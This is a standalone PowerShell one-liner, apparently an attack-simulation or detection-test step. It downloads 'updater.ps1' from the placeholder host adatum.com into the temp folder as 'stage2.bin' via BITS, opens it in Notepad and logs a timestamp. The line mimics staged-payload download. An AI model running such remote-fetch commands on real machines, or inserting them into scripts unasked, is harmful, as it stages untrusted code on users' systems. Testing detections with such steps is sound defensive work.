
$TargetUrl = 'http://adatum.com/updater.ps1'; $OutputPath = "$env:TEMP\stage2.bin"; Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath; Start-Process -FilePath "notepad.exe" -ArgumentList $OutputPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
